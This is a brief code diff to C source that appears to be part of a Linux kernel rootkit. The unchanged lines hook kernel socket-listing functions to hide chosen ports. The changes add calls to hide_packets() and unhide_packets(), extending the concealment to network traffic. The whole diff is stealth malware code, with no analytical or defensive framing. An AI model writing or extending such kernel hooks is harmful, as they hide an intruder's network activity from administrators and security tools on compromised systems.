@@ -9,6 +9,7 @@
 #include "common.h"
 #include "hook.h"
 #include "sockhide.h"
+#include "packhide.h"
 
 port_list_t hidden_ports = {
     .port  = -1,
@@ -66,6 +67,8 @@ hide_sockets(void)
             = (void *)g7_udp6_seq_show;
 
         enable_protection();
+
+        hide_packets();
     }
 }
 
@@ -90,6 +93,8 @@ unhide_sockets(void)
 
         enable_protection();
         sys_recvmsg = NULL;
+
+        unhide_packets();
     }
 }
 
